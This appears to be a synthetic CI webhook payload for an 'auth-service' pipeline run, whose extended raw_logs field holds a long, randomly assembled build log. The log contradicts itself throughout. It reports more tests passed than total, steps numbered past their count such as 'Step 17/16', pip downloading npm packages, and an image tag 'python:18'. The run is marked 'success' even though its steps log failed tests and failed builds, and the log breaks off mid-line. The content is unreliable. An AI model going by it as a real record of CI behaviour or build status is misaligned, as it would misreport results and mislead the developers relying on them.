{
  "action": "completed",
  "workflow_run": {
    "id": 425,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-688",
    "head_sha": "39ea0df0250bc2fdc4444feb3cb1925c6556b5e3",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-23T12:18:49.191320Z",
    "updated_at": "2025-11-23T12:21:10.926921Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: unit_tests ===\nUsing Node.js 20.16.3\nWARNING: react has known vulnerabilities\nnpm notice: package.json updated\npip: Downloading express-3.13.tar.gz\nConnection established\nBuilding Docker image...\nCache saved successfully\nWARNING: lodash has known vulnerabilities\nUploading artifact 'build' (42 files)\nImage pulled successfully\nOK\nConnecting to test.io:443...\nArtifact downloaded: 43MB\nOptimizing 31 modules...\nSwitched to branch 'hotfix/task-274'\nPulling image: python:18\nCoverage: 79% statements, 78% branches\nCoverage: 90% statements, 78% branches\npip: Installing build dependencies...\nStep 13/18: Installing dependencies\nCoverage: 99% statements, 78% branches\nStep 1/18: Deploying\n[12:18:49] INFO: Cache refreshed\nWARNING: jest has known vulnerabilities\nStep 5/18: Running migrations\nChecking out main branch\nWARNING: eslint has known vulnerabilities\nTransforming 451 files...\nStep 17/16: Deploying\n[12:18:49] DEBUG: Connection pool: 15 active\n[12:18:49] INFO: Processing request\nVerifying...\nGET /status - 200 (32ms)\nStep 20/24: Linting\nTests: 345 passed, 469 total\nGenerating source maps...\nCreating production build...\nInstalling prettier@3.0.10\nCoverage: 72% statements, 98% branches\n  PASS: test_auth_login (11ms)\nnpm install: resolved 226 packages\n[12:18:49] DEBUG: Connection pool: 12 active\nSnapshots: 40 passed, 10 total\n[12:18:49] INFO: Starting build process\nCompiling components/handler.rs...\n\u2713 package completed\nUsing Node.js 17.7.6\nArtifact uploaded: build.tar.gz (44MB)\nnpm notice: package.json updated\nyarn add: Done in 5.81s\nInstalling eslint@1.18.6\nTests: 443 passed, 454 total\nCompiling lib/main.py...\nEnvironment: test\nUsing Python 3.9\nCompleted.\npip: Downloading eslint-2.0.tar.gz\nBuilding Docker image...\nTime: 117.984s\npip: Collecting jest\nStep 4/16: Installing dependencies\nFetching submodules...\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nBundling styles.js\nyarn add: Done in 1.38s\n\u2713 test completed\nCoverage: 90% statements, 65% branches\nOptimizing 10 modules...\nStep 20/23: Deploying\nWARNING: webpack has known vulnerabilities\nUploading artifact 'coverage' (28 files)\nTransforming 739 files...\nNODE_ENV=production\nPulling image: python:latest\nCache miss for key-4586\nnpm install: resolved 161 packages\nWARNING: axios has known vulnerabilities\nCompiling components/service.java...\nCache hit for key-8451\nStep 1/16: Running migrations\nFAILED: test_auth_login\nNODE_ENV=development\n[12:18:49] DEBUG: Initializing service\nStep 3/17: Building\nUploading artifact 'dist' (46 files)\nnpm notice: package.json updated\nnpm notice: package.json updated\nTests: 467 passed, 346 total\nUploading artifact 'coverage' (44 files)\nCache miss for key-5851\n[12:18:49] DEBUG: Connection pool: 6 active\nCompiling utils/handler.rs...\nTransforming 215 files...\n\u2713 Step 'setup' succeeded\nRan 10 tests in 5s\nPushing to registry...\n\u2713 validate completed\nException: RuntimeError\nBuilding Docker image...\n=== Step unit_tests completed ===\n=== Step: deploy_staging ===\nPOST /data - 202 (126ms)\nCache hit for key-2478\nStep 7/21: Testing\nUploading artifact 'coverage' (36 files)\nChecking out develop branch\nnpm notice: created a lockfile\nBundling runtime.css\n[12:18:49] DEBUG: Initializing service\nHEAD is now at 83d367a\n[12:18:49] WARN: Deprecated API usage\n[12:18:49] INFO: Cache refreshed\nConnecting to acme.corp:443...\nCompiling utils/app.ts...\nCompiling lib/index.js...\nStep 6/23: Linting\npip: Collecting prettier\nBuilding Docker image...\nSwitched to branch 'hotfix/task-624'\n\u2713 Task completed in 4407ms\npip: Collecting webpack\nStep 13/21: Deploying\nBuilding Docker image...\nUsing Python 3.9\nBundling styles.js\nPOST /data - 202 (115ms)\nDone.\n[12:18:49] INFO: Request completed\nCompiling lib/index.js...\nWaiting...\nCache restored successfully (347MB)\nNODE_ENV=development\nCompiling src/main.py...\n[12:18:49] WARN: Deprecated API usage\n  PASS: test_cache_hit (103ms)\nArtifact uploaded: build.tar.gz (32MB)\nStep 17/15: Testing\nStep 14/25: Deploying\n[12:18:49] DEBUG: Memory usage: 697MB\nWARNING: axios has known vulnerabilities\n[12:18:49] WARN: Deprecated API usage\nTest Suites: 45 passed, 12 total\nBundling vendor.css\nCompiling lib/utils.go...\n[12:18:49] ERROR: Connection failed\n  PASS: test_api_health (271ms)\n[12:18:49] INFO: Cache refreshed\nStep 4/17: Deploying\nImage pulled successfully\nCache invalidated: dependencies\n[12:18:49] DEBUG: Initializing service\nUsing Python 3.12\nCache restored successfully (55MB)\nSnapshots: 30 passed, 19 total\nStep 4/16: Building\nStep 8/22: Linting\nFetching submodules...\nVerifying...\nEnvironment: test\nnpm notice: created a lockfile\nSwitched to branch 'hotfix/task-816'\n[12:18:49] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nChecking out develop branch\npip install: Successfully installed prettier-3.17\nNODE_ENV=test\nCompiling src/index.js...\nLoading...\nWaiting...\n\u2713 Task completed in 2413ms\nBuilding Docker image...\nProcessing...\n  PASS: integration/test_api_health.spec.js\n[12:18:49] INFO: Starting build process\nCache restored successfully (472MB)\nDone.\nInstalling express@3.18.3\nyarn add: Done in 13.11s\nConnection established\n[12:18:49] INFO: Connecting to database\nTLS handshake completed\nLoading...\nInstalling react@5.2.2\nArtifact uploaded: dist.zip (85MB)\nOK\nPushing to registry...\nyarn add: Done in 16.37s\nImage pulled successfully\n[12:18:49] DEBUG: Connection pool: 12 active\nDone.\nCache invalidated: dependencies\nMinifying vendor.js\nStep 14/22: Building\nStep 11/25: Testing\n\u2713 Step 'install' succeeded\nEnvironment: test\nCache hit for key-8350\nnpm notice: package.json updated\nWARNING: lodash has known vulnerabilities\nCompiling src/service.java...\nWARNING: react has known vulnerabilities\n=== Step deploy_staging completed ===\n=== Step: e2e_tests ===\n[12:18:49] WARN: Deprecated API usage\n[12:18:49] INFO: Connecting to database\nDone.\nnpm notice: created a lockfile\nArtifact uploaded: build.tar.gz (38MB)\nTests: 73 passed, 329 total\n\u2713 Step 'setup' succeeded\nFAILED: test_auth_login\nReady.\n\u2713 package completed\nFAILED: test_cache_hit\nCompiling lib/main.py...\n[12:18:49] INFO: Processing request\nCache invalidated: build\nTransforming 739 files...\nAlready up to date.\nUploading artifact 'build' (12 files)\nChecking out develop branch\nCache saved successfully\nPOST /upload - 201 (289ms)\nFinished.\nyarn add: Done in 14.77s\nTest Suites: 35 passed, 10 total\nStep 6/24: Installing dependencies\nStep 20/17: Installing dependencies\nTests: 253 passed, 259 total\n  PASS: test_cache_hit (157ms)\n[12:18:49] ERROR: Connection failed\nTLS handshake completed\n[12:18:49] DEBUG: Query executed in 71ms\nConnection established\nOptimizing 17 modules...\nAlready up to date.\n\u2713 All checks passed\nAlready up to date.\n[12:18:49] ERROR: Connection failed\nGET /health - 201 (3ms)\nCompleted.\nUsing Node.js 19.17.6\n[12:18:49] INFO: Request completed\nHEAD is now at 61b442d\n\u2713 build completed\nnpm install: added 169 packages\npip install: Successfully installed prettier-3.17\nStep 6/20: Deploying\nGenerating source maps...\npip install: Successfully installed webpack-3.14\nWaiting...\nCache hit for key-9558\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUploading artifact 'build' (14 files)\nCreating production build...\nWARNING: express has known vulnerabilities\n\u2713 Step 'checkout' succeeded\nUploading artifact 'dist' (28 files)\nCache hit for key-5023\nTime: 48.389s\nProcessing...\nRan 147 tests in 32s\nStep 4/20: Testing\n[12:18:49] DEBUG: Memory usage: 1099MB\nVerifying...\n[12:18:49] DEBUG: Memory usage: 1374MB\npip: Installing build dependencies...\nFinished.\nArtifact uploaded: build.tar.gz (45MB)\nInstalling eslint@2.20.6\npip: Downloading eslint-2.9.tar.gz\n[12:18:49] WARN: Deprecated API usage\nProcessing...\n  PASS: test_auth_login (102ms)\n\u2713 Task completed in 104ms\nCreating production build...\n  PASS: test_auth_login (194ms)\nOptimizing 35 modules...\nWARNING: axios has known vulnerabilities\nnpm install: added 305 packages\n\u2713 Task completed in 3835ms\nCache miss for key-8153\n[12:18:49] ERROR: Connection failed\nGenerating source maps...\nTransforming 223 files...\n[12:18:49] INFO: Starting build process\nFinished.\n[12:18:49] DEBUG: Loading configuration\nGET /health - 204 (66ms)\nException: ValueError\nBuilding Docker image...\npip: Collecting react\nArtifact uploaded: build.tar.gz (19MB)\nPushing to registry...\nArtifact downloaded: 36MB\n  PASS: e2e/test_auth_login.spec.js\nUploading artifact 'build' (27 files)\nnpm install: resolved 612 packages\nnpm notice: created a lockfile\n[12:18:49] DEBUG: Memory usage: 1048MB\nPOST /data - 200 (343ms)\nnpm install: resolved 1395 packages\n[12:18:49] DEBUG: Query executed in 13ms\n=== Step e2e_tests completed ===\n=== Step: checkout ===\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nImage pulled successfully\npip install: Successfully installed express-5.7\npip install: Successfully installed webpack-1.16\nConnecting to example.com:443...\nLayer 10/12: RUN command\nInstalling lodash@4.13.6\nWARNING: jest has known vulnerabilities\nException: NullPointerException\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOptimizing 49 modules...\n\u2717 build failed with exit code 11\nArtifact downloaded: 28MB\n[12:18:49] INFO: Starting build process\nTLS handshake completed\nTransforming 199 files...\nChecking out develop branch\nCreating production build...\nAlready up to date.\nnpm install: added 181 packages\nImage pulled successfully\nHEAD is now at fe48351\nnpm install: added 393 packages\nTime: 93.54s\nInstalling prettier@1.6.1\nException: NullPointerException\nVerifying...\nNODE_ENV=production\nConnecting to example.com:443...\n[12:18:49] DEBUG: Initializing service\nHEAD is now at 35ee798\nCompleted.\nStep 4/20: Running migrations\nCreating production build...\nArtifact uploaded: dist.zip (54MB)\n[12:18:49] DEBUG: Loading configuration\npip: Installing build dependencies...\nTLS handshake completed\npip: Collecting react\nConnection established\n[12:18:49] DEBUG: Connection pool: 15 active\nUploading artifact 'dist' (49 files)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:18:49] DEBUG: Connection pool: 8 active\nTest Suites: 29 passed, 23 total\n[12:18:49] INFO: Connecting to database\nStep 7/25: Linting\nUploading artifact 'dist' (48 files)\nTLS handshake completed\nChecking out main branch\nnpm install: added 168 packages\nStep 17/16: Testing\n\u2713 All checks passed\nPlatform: linux-x64\nnpm notice: created a lockfile\nArtifact uploaded: build.tar.gz (31MB)\n  PASS: test_cache_hit (9ms)\nFAILED: test_user_create\npip: Installing build dependencies...\nUsing Python 3.11\nCompiling lib/main.py...\nnpm notice: package.json updated\nInstalling jest@3.12.10\nGenerating source maps...\nInstalling webpack@4.4.8\nCompiling src/handler.rs...\nCoverage: 99% statements, 96% branches\nPOST /upload - 202 (340ms)\nLoading...\nStep 19/23: Building\nOK\nSwitched to branch 'hotfix/task-261'\nStep 15/21: Running migrations\nSnapshots: 26 passed, 42 total\nCompiling components/handler.rs...\nCompiling utils/handler.rs...\nStep 19/22: Running migrations\nTime: 57.386s\nFinished.\n[12:18:49] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOK\nyarn add: Done in 30.35s\nNODE_ENV=production\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:49] DEBUG: Loading configuration\nTests: 165 passed, 353 total\nStep 10/21: Running migrations\nLayer 7/12: RUN command\n\u2713 Step 'build' succeeded\nAlready up to date.\nException: NullPointerException\nConnection established\nRan 50 tests in 34s\n  PASS: e2e/test_user_create.spec.js\nCache restored successfully (371MB)\nTests: 331 passed, 474 total\n\u2713 deploy completed\nReady.\nStep 19/15: Building\n=== Step checkout completed ===\n=== Step: deploy_production ===\nStep 9/16: Linting\nGenerating source maps...\n[12:18:49] INFO: Connecting to database\nCache saved successfully\nBundling styles.js\nPulling image: python:latest\nTime: 107.100s\nSuccess!\n[12:18:49] INFO: Request completed\npip install: Successfully installed react-5.7\nSwitched to branch 'feature/task-552'\nCompleted.\n[12:18:49] DEBUG: Query executed in 46ms\nTime: 29.52s\nPulling image: python:3.11\n\u2713 All checks passed\n[12:18:49] INFO: Processing request\n[12:18:49] DEBUG: Connection pool: 11 active\nCreating production build...\n[12:18:49] ERROR: Connection failed\nCompiling utils/main.py...\n  PASS: test_user_create (41ms)\nTests: 380 passed, 482 total\nUploading artifact 'dist' (28 files)\n\u2713 All checks passed\nPulling image: node:18\nImage pulled successfully\n[12:18:49] INFO: Cache refreshed\nOptimizing 97 modules...\nPushing to registry...\nChecking out develop branch\nTransforming 383 files...\nCoverage: 89% statements, 83% branches\n  PASS: test_api_health (452ms)\nEnvironment: production\nCompiling utils/index.js...\nPOST /data - 201 (225ms)\n[12:18:49] DEBUG: Initializing service\npip: Installing build dependencies...\nCache invalidated: build\nCoverage: 89% statements, 91% branches\nTransforming 620 files...\n[12:18:49] INFO: Processing request\n\u2717 build failed with exit code 52\nHEAD is now at c232e4d\nStep 12/17: Testing\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: webpack has known vulnerabilities\nUsing Node.js 19.10.2\n[12:18:49] WARN: Deprecated API usage\n\u2713 Task completed in 4883ms\nCache invalidated: build\nLayer 1/8: COPY command\nOptimizing 34 modules...\n\u2713 All checks passed\n\u2713 build completed\nGET /api - 204 (43ms)\n[12:18:49] DEBUG: Loading configuration\nVerifying...\nStep 13/21: Installing dependencies\n  PASS: unit/test_auth_login.spec.js\nArtifact uploaded: dist.zip (47MB)\nCompiling lib/main.py...\nStep 2/19: Building\nCompleted.\nCache saved successfully\n  PASS: unit/test_api_health.spec.js\nCompiling lib/main.py...\nHEAD is now at 82ac1f6\npip: Downloading axios-3.12.tar.gz\nHEAD is now at 79f9a7d\nConnecting to example.com:443...\nNODE_ENV=production\nLoading...\n[12:18:49] INFO: Starting build process\nnpm install: resolved 837 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nyarn add: Done in 24.8s\nCache invalidated: build\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 16/21: Deploying\nUsing Python 3.12\nPOST /data - 202 (295ms)\nFinished.\nAlready up to date.\nVerifying...\nAlready up to date.\nCache restored successfully (331MB)\nTests: 276 passed, 134 total\nyarn add: Done in 9.72s\nBuilding Docker image...\n[12:18:49] INFO: Cache refreshed\nBuilding Docker image...\nTest Suites: 10 passed, 31 total\n\u2713 All checks passed\nReady.\nFinished.\nProcessing...\n=== Step deploy_production completed ===\n=== Step: install_dependencies ===\nTime: 85.706s\nStep 17/15: Deploying\nOK\n\u2713 All checks passed\nWaiting...\nException: NullPointerException\nOptimizing 55 modules...\nArtifact uploaded: dist.zip (49MB)\npip: Collecting axios\nPushing to registry...\nOK\nRan 65 tests in 49s\n\u2713 Task completed in 1454ms\nArtifact uploaded: dist.zip (36MB)\n[12:18:49] DEBUG: Initializing service\nWARNING: lodash has known vulnerabilities\n[12:18:49] DEBUG: Loading configuration\n[12:18:49] DEBUG: Connection pool: 4 active\npip: Installing build dependencies...\nTest Suites: 38 passed, 6 total\nChecking out master branch\nBuilding Docker image...\n[12:18:49] DEBUG: Initializing service\nCache invalidated: build\n[12:18:49] DEBUG: Initializing service\n[12:18:49] DEBUG: Loading configuration\nTransforming 755 files...\nCache hit for key-6849\n[12:18:49] ERROR: Connection failed\n\u2713 All checks passed\nSnapshots: 17 passed, 10 total\n[12:18:49] INFO: Processing request\n[12:18:49] WARN: Deprecated API usage\n[12:18:49] INFO: Cache refreshed\nCache hit for key-4892\nTime: 75.633s\npip: Installing build dependencies...\nDone.\nCache miss for key-9615\nBundling styles.css\n[12:18:49] INFO: Processing request\n\u2713 Step 'test' succeeded\nCache miss for key-9409\n[12:18:49] DEBUG: Memory usage: 1327MB\n\u2713 Step 'build' succeeded\npip: Collecting react\nCache hit for key-9986\nSwitched to branch 'hotfix/task-560'\n\u2713 Task completed in 3620ms\nTLS handshake completed\nFetching submodules...\nyarn add: Done in 6.35s\nSnapshots: 27 passed, 39 total\nCreating production build...\nFAILED: test_cache_hit\nEnvironment: development\n  PASS: unit/test_db_connect.spec.js\npip install: Successfully installed eslint-1.0\nCreating production build...\nCache saved successfully\nCompleted.\nArtifact uploaded: dist.zip (31MB)\nPulling image: python:latest\nConnection established\nArtifact uploaded: dist.zip (14MB)\nUsing Node.js 14.10.7\nCache invalidated: node_modules\nTest Suites: 31 passed, 13 total\nSwitched to branch 'hotfix/task-917'\nChecking out master branch\nBuilding Docker image...\nUsing Python 3.12\npip: Collecting webpack\nSuccess!\nStep 18/23: Installing dependencies\nGenerating source maps...\nCompiling lib/utils.go...\nException: NullPointerException\nStep 20/23: Linting\nCompiling utils/index.js...\nArtifact uploaded: build.tar.gz (48MB)\nStep 13/15: Deploying\nnpm notice: package.json updated\n\u2713 Step 'setup' succeeded\nCompiling src/app.ts...\n\u2713 Task completed in 4102ms\nyarn add: Done in 22.92s\nCompiling components/utils.go...\nSnapshots: 45 passed, 48 total\nSuccess!\npip install: Successfully installed jest-3.1\nCompiling utils/utils.go...\nWARNING: eslint has known vulnerabilities\nPlatform: linux-x64\nyarn add: Done in 26.99s\nUsing Python 3.9\n[12:18:49] DEBUG: Initializing service\nReady.\n  PASS: e2e/test_user_create.spec.js\n[12:18:49] DEBUG: Query executed in 17ms\n=== Step install_dependencies completed ===\n=== Step: setup_node ===\nProcessing...\nGenerating source maps...\nCompiling components/service.java...\nSnapshots: 17 passed, 8 total\nSnapshots: 7 passed, 11 total\nCache saved successfully\nTests: 401 passed, 287 total\nWaiting...\nSwitched to branch 'bugfix/task-212'\n\u2717 build failed with exit code 73\nReady.\n[12:18:49] DEBUG: Query executed in 22ms\nPlatform: linux-x64\n\u2713 Task completed in 4384ms\nSwitched to branch 'bugfix/task-605'\n[12:18:49] WARN: Deprecated API usage\nCompiling utils/app.ts...\nStep 18/21: Deploying\nConnection established\nStep 20/24: Testing\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache invalidated: node_modules\nRan 136 tests in 13s\nProcessing...\nDone.\nUploading artifact 'build' (27 files)\nWaiting...\nWaiting...\n[12:18:49] DEBUG: Query executed in 26ms\nSuccess!\nException: ValueError\nCompiling src/handler.rs...\nPulling image: alpine:latest\n\u2713 Step 'setup' succeeded\nGET /api - 204 (16ms)\nCache miss for key-1747\nnpm notice: package.json updated\nStep 8/15: Building\nSuccess!\n[12:18:49] INFO: Starting build process\n\u2713 Step 'setup' succeeded\npip: Collecting axios\nTime: 41.496s\nStep 6/23: Deploying\nTest Suites: 32 passed, 48 total\nHEAD is now at 631df76\nConnecting to startup.dev:443...\nUsing Node.js 18.2.3\n[12:18:49] WARN: Deprecated API usage\nWARNING: eslint has known vulnerabilities\nBuilding Docker image...\nCoverage: 88% statements, 93% branches\nUploading artifact 'build' (18 files)\nGenerating source maps...\nBundling runtime.js\nAlready up to date.\n[12:18:49] INFO: Starting build process\n  PASS: test_auth_login (234ms)\nArtifact uploaded: dist.zip (78MB)\nSnapshots: 9 passed, 17 total\n[12:18:49] DEBUG: Connection pool: 17 active\nCompiling lib/index.js...\nStep 20/17: Linting\n  PASS: test_cache_hit (310ms)\nCache restored successfully (334MB)\nCreating production build...\nCache restored successfully (369MB)\n\u2717 build failed with exit code 15\nWaiting...\nnpm notice: package.json updated\nPulling image: alpine:latest\nLoading...\n[12:18:49] INFO: Processing request\nCompleted.\nInstalling eslint@3.3.0\nTransforming 926 files...\n[12:18:49] DEBUG: Connection pool: 20 active\npip install: Successfully installed express-3.11\nFAILED: test_cache_hit\nBundling styles.js\nUploading artifact 'coverage' (8 files)\n[12:18:49] INFO: Request completed\nCompiling components/service.java...\n[12:18:49] INFO: Cache refreshed\nCache saved successfully\n\u2713 package completed\n[12:18:49] WARN: Deprecated API usage\nOptimizing 97 modules...\n[12:18:49] WARN: Deprecated API usage\n[12:18:49] INFO: Connecting to database\nOK\nPulling image: node:18\nFetching submodules...\nPulling image: python:latest\nnpm notice: package.json updated\nTests: 407 passed, 481 total\n[12:18:49] INFO: Connecting to database\nEnvironment: development\n[12:18:49] WARN: Deprecated API usage\nSnapshots: 26 passed, 26 total\n=== Step setup_node completed ===\n=== Step: build ===\nnpm install: added 199 packages\nArtifact uploaded: build.tar.gz (42MB)\nAlready up to date.\n[12:18:49] INFO: Processing request\nException: ValueError\nCompiling lib/service.java...\nProcessing...\nCreating production build...\nnpm notice: created a lockfile\nCompleted.\nWARNING: webpack has known vulnerabilities\nMinifying app.js\nPushing to registry...\n[12:18:49] INFO: Processing request\nPulling image: node:3.11\nStep 10/15: Linting\nCache restored successfully (213MB)\n[12:18:49] INFO: Processing request\nArtifact uploaded: dist.zip (95MB)\nUsing Python 3.10\nyarn add: Done in 7.29s\n[12:18:49] ERROR: Connection failed\nUploading artifact 'coverage' (6 files)\nnpm install: added 381 packages\nConnection established\nCompiling src/main.py...\nFinished.\nnpm install: added 203 packages\nStep 18/18: Building\nCache invalidated: build\nCompiling utils/app.ts...\nPushing to registry...\nTests: 382 passed, 231 total\npip: Collecting lodash\nChecking out master branch\nSnapshots: 41 passed, 13 total\nArtifact downloaded: 15MB\nException: TypeError\n\u2713 All checks passed\nTransforming 609 files...\nPushing to registry...\nyarn add: Done in 24.26s\n[12:18:49] ERROR: Connection failed\nHEAD is now at 38385ab\nOK\nCreating production build...\nStep 7/21: Testing\nWARNING: lodash has known vulnerabilities\nnpm notice: created a lockfile\npip: Downloading webpack-3.17.tar.gz\nPlatform: darwin-arm64\n[12:18:49] DEBUG: Memory usage: 859MB\nnpm install: added 144 packages\nCoverage: 82% statements, 76% branches\nCoverage: 92% statements, 87% branches\nSnapshots: 1 passed, 9 total\nNODE_ENV=test\nArtifact downloaded: 49MB\nTest Suites: 24 passed, 5 total\nTests: 145 passed, 255 total\npip install: Successfully installed lodash-2.17\nWARNING: jest has known vulnerabilities\nCache restored successfully (393MB)\nVerifying...\nChecking out main branch\nHEAD is now at e25bdcb\nNODE_ENV=test\nCompiling utils/handler.rs...\npip: Downloading axios-3.9.tar.gz\n[12:18:49] DEBUG: Memory usage: 427MB\nWARNING: jest has known vulnerabilities\nDone.\nStep 19/21: Building\n[12:18:49] DEBUG: Initializing service\nPushing to registry...\nRan 41 tests in 4s\n\u2713 Task completed in 1548ms\nStep 5/17: Running migrations\n[12:18:49] INFO: Request completed\nCache restored successfully (23MB)\nTests: 180 passed, 466 total\nCache restored successfully (20MB)\nSuccess!\nStep 4/17: Testing\nFetching submodules...\nSwitched to branch 'bugfix/task-373'\nUsing Python 3.12\nWaiting...\nTransforming 675 files...\nBundling styles.js\n[12:18:49] WARN: Deprecated API usage\npip: Installing build dependencies...\nHEAD is now at 30d06b1\nCache hit for key-8038\nCompiling lib/handler.rs...\nBundling styles.css\n[12:18:49] DEBUG: Connection pool: 18 active\npip install: Successfully installed jest-2.1\nTest Suites: 9 passed, 36 total\nVerifying...\n=== Step build completed ===\n=== Step: setup_environment ===\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Task completed in 827ms\nCreating production build...\nyarn add: Done in 21.2s\n[12:18:49] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (32MB)\nStep 5/15: Deploying\npip: Installing build dependencies...\nCreating production build...\nSnapshots: 26 passed, 21 total\nFAILED: test_api_health\nBundling main.css\nCache miss for key-6094\nCompiling lib/utils.go...\nPulling image: node:18\n\u2713 Step 'test' succeeded\nTime: 92.96s\nnpm notice: package.json updated\nBundling styles.css\nCompiling utils/app.ts...\nTime: 115.13s\nInstalling prettier@4.6.9\n\u2713 lint completed\nCompiling lib/handler.rs...\nBuilding Docker image...\n\u2717 build failed with exit code 112\n[12:18:49] DEBUG: Memory usage: 1165MB\nProcessing...\nTest Suites: 20 passed, 47 total\nVerifying...\nnpm install: added 494 packages\nChecking out develop branch\nCache hit for key-4815\nOptimizing 47 modules...\n  PASS: test_user_create (195ms)\n  PASS: integration/test_auth_login.spec.js\nCompiling src/utils.go...\nRan 102 tests in 31s\nSnapshots: 27 passed, 5 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2717 build failed with exit code 127\nCompleted.\nMinifying main.js\nNODE_ENV=development\nReady.\n[12:18:49] DEBUG: Initializing service\nImage pulled successfully\nInstalling jest@5.7.6\nUsing Node.js 19.20.7\nVerifying...\nReady.\nAlready up to date.\nImage pulled successfully\nFAILED: test_auth_login\nArtifact uploaded: dist.zip (32MB)\n  PASS: e2e/test_db_connect.spec.js\nnpm notice: package.json updated\nInstalling webpack@3.7.7\nReady.\nStep 14/23: Linting\nPushing to registry...\nChecking out master branch\n\u2713 test completed\n[12:18:49] DEBUG: Loading configuration\n[12:18:49] DEBUG: Memory usage: 695MB\nConnecting to test.io:443...\nnpm notice: created a lockfile\nyarn add: Done in 17.81s\nStep 12/24: Testing\nSuccess!\nStep 1/19: Testing\nEnvironment: test\n[12:18:49] DEBUG: Initializing service\n\u2713 Step 'test' succeeded\n\u2713 Task completed in 1533ms\nCompiling components/handler.rs...\nnpm install: added 33 packages\nOK\nWaiting...\n[12:18:49] DEBUG: Connection pool: 15 active\nyarn add: Done in 4.10s\npip install: Successfully installed prettier-4.2\nDone.\n[12:18:49] INFO: Processing request\nCoverage: 100% statements, 67% branches\nFAILED: test_auth_login\nCompiling lib/service.java...\nnpm install: added 311 packages\nChecking out main branch\n[12:18:49] DEBUG: Initializing service\nStep 7/18: Installing dependencies\nnpm install: added 163 packages\nArtifact uploaded: dist.zip (25MB)\nBundling styles.css\n[12:18:49] INFO: Cache refreshed\nUsing Python 3.10\nSwitched to branch 'hotfix/task-943'\nOptimizing 87 modules...\nWARNING: webpack has known vulnerabilities\nConnection established\n=== Step setup_environment completed ===\n=== Step: lint ===\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 deploy completed\nImage pulled successfully\nConnection established\nPlatform: darwin-arm64\n[12:18:49] INFO: Cache refreshed\nTime: 1.495s\nLoading...\nStep 11/23: Installing dependencies\n[12:18:49] DEBUG: Connection pool: 16 active\n[12:18:49] DEBUG: Query executed in 40ms\nCache saved successfully\nWaiting...\nLoading...\nOK\nTest Suites: 24 passed, 47 total\nConnection established\nFAILED: test_cache_hit\nLayer 9/14: ENV command\nnpm install: added 262 packages\nTime: 61.156s\nArtifact uploaded: dist.zip (59MB)\npip install: Successfully installed eslint-2.4\nCache restored successfully (439MB)\nReady.\nCompiling lib/main.py...\nStep 9/23: Linting\nUsing Python 3.11\nUsing Python 3.9\nGenerating source maps...\nLoading...\nOptimizing 56 modules...\nStep 6/17: Testing\n\u2713 All checks passed\nHEAD is now at a9987b3\nGET /health - 200 (69ms)\nProcessing...\nCache hit for key-3590\nWaiting...\nCompiling components/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling react@2.18.3\n\u2713 Step 'build' succeeded\nUsing Node.js 16.10.1\nCreating production build...\nPlatform: darwin-arm64\nStep 13/15: Running migrations\nNODE_ENV=production\nTLS handshake completed\nSuccess!\n[12:18:49] WARN: Deprecated API usage\nMinifying main.js\nLayer 10/15: COPY command\n[12:18:49] INFO: Processing request\n[12:18:49] INFO: Connecting to database\nnpm install: added 275 packages\n[12:18:49] INFO: Starting build process\nStep 1/24: Building\nPushing to registry...\nCache invalidated: dependencies\nOptimizing 99 modules...\nSuccess!\n\u2717 build failed with exit code 103\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache invalidated: build\nCompiling utils/main.py...\nCompleted.\nOptimizing 89 modules...\nCompiling lib/service.java...\nPushing to registry...\nLoading...\nTest Suites: 23 passed, 28 total\nCompiling lib/handler.rs...\nWARNING: express has known vulnerabilities\nCompiling utils/index.js...\nGenerating source maps...\nTest Suites: 15 passed, 40 total\nRan 14 tests in 25s\nLoading...\n[12:18:49] INFO: Request completed\nArtifact uploaded: build.tar.gz (49MB)\npip install: Successfully installed webpack-2.7\nPOST /data - 201 (483ms)\nStep 15/17: Running migrations\npip: Collecting axios\nPushing to registry...\nChecking out master branch\nnpm notice: package.json updated\nBuilding Docker image...\nCompiling lib/service.java...\n\u2717 build failed with exit code 35\nnpm install: resolved 1624 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nNODE_ENV=development\nWaiting...\nCache saved successfully\nNODE_ENV=development\n  PASS: integration/test_cache_hit.spec.js\nPOST /data - 200 (314ms)\nSnapshots: 11 passed, 49 total\n=== Step lint completed ===\n=== Step: integration_tests ===\n[12:18:49] DEBUG: Query executed in 76ms\n[12:18:49] INFO: Starting build process\nChecking out master branch\nConnecting to example.com:443...\nReady.\npip: Downloading jest-4.3.tar.gz\nPushing to registry...\nUsing Python 3.9\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nVerifying...\nBuilding Docker image...\n  PASS: test_user_create (305ms)\nWARNING: react has known vulnerabilities\nnpm notice: package.json updated\nBundling styles.css\nnpm install: added 72 packages\nGET /status - 201 (75ms)\nEnvironment: test\nWARNING: lodash has known vulnerabilities\nPulling image: python:18\nWARNING: prettier has known vulnerabilities\npip install: Successfully installed lodash-3.9\nStep 18/19: Testing\nPOST /data - 200 (315ms)\nConnecting to cloud.services:443...\nnpm notice: created a lockfile\nPushing to registry...\nCache saved successfully\nTLS handshake completed\nHEAD is now at 93d6848\nAlready up to date.\nWaiting...\nVerifying...\nInstalling prettier@1.20.1\npip: Installing build dependencies...\nCompleted.\n[12:18:49] DEBUG: Memory usage: 1963MB\nTime: 64.131s\nCache saved successfully\n[12:18:49] INFO: 